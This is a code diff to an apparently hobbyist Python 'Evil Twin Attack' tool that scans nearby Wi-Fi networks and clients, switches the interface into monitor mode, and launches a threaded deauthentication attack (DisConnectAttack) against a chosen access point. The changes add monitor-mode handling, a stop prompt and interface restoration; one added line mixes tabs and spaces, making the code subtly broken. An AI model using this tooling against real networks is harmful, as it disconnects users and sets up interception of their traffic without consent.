@@ -4,6 +4,9 @@ import sys
 import threading
 import time
 import logging
+import MonitorMode as mm
+import signal
+
 
 iface = ""
 users_list = []
@@ -18,6 +21,7 @@ def Wifi_scaning():
 
 def Users_scaning():
     print("Finds connected Clients")
+    print("press CTRL+C to stop the scanning")
     print ("index       Client MAC")
     sniff (iface = iface, prn = Users_handler)
      
@@ -52,8 +56,10 @@ def DisConnectAttack(target_mac , gateway_mac, iface):
 
 def main():
     global iface ,ap_mac
-    print("********Evil Twin Attack*********")
     iface = input("please enter your interface: ")
+    iface = mm.Change_to_MonitorMode(iface)
+    print("********Evil Twin Attack*********")
+    time.sleep(1)
     Wifi_scaning()
     # Choose wifi to attack
     if len(ap_list) > 0 :
@@ -68,6 +74,12 @@ def main():
         disconnectThread.start()
         time.sleep(3)
         print("process keep going...")
+    while True:
+        try:
+            time.sleep(2) 
+        except KeyboardInterrupt:
+			break
+    mm.Change_back(iface)
 
 
 if __name__ == "__main__":
